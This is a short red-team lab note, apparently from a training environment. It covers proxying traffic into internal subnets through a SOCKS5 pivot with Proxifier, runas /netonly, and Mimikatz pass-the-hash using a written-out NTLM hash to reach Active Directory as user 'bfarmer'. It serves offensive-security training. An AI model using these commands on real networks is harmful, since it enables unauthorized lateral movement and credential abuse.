# Proxifier

* https://www.proxifier.com/

#### Create New Proxy Entry

```
Profile > Proxy Servers > Add

Use this proxy by default > No

Go to Proxification Rules > Yes

Add
    Name:  Tools
    Applications:  Any
    Target hosts:  10.10.120.0/24;10.10.122.0/23
    Target ports:  Any
    Action:  Proxy SOCKS5 10.10.5.50
```

### On Attacker Windows

#### 1. Runas Target Domain User

```
runas /netonly /user:DEV\bfarmer mmc.exe
```

* Output:

```
Enter the password For DEV\bfarmer:
Attempting to start mmc.exe as user "DEV\bfarmer" ...
```

#### 2. Mimikatz

```
privilege::debug
sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```

#### MMC

* File > Add/Remove Snap-in (Ctrl+M)
* Specify Active Directory Users and Computers
* Right click on the snap-in > Change Domain > Enter dev.cyberbotic.io
